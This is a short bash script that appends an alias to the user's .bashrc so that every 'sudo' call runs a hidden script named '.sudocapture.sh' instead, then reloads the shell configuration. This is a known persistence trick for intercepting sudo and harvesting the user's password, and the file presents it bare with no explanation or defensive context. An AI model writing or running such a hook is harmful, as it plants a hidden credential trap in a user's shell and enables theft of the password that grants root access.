#!/bin/bash

echo "alias sudo=\"$(pwd)/.sudocapture.sh\" #uid:=kq%?" >> /home/$(whoami)/.bashrc
source ~/.bashrc
